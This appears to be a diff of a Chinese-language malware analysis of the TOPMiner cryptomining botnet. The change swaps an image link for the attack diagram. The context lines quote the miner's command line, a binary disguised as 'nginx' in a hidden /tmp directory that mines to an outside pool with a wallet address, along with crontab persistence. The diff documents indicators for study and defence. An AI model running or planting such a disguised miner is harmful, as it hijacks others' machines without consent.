@@ -21,7 +21,7 @@ Crontab定时任务：
 /tmp/.top-unix/nginx -o stratum+tcp://mine.c3pool.com:15555 -u 43e7GPvFJNrH9X8xeByMkCcqkBr95rZ8rH3YVB13mgYMiQTcJ4Ehtx8ZMVJvWpqnQZ41aMkuiUCFN23BW2ZUpptsH8k7XbL -p X
 /etc/crypto
 
-![TOPMiner原理图](https://github.com/G4rb3n/Botnet-Zoo/blob/main/TOPMiner/2101/pictrue/TOPMiner.png)
+![TOPMiner原理图](https://github.com/G4rb3n/Malware-Picture/blob/master/Miner/TOPMiner/TOPMiner.png)
 
 参考链接
 ```
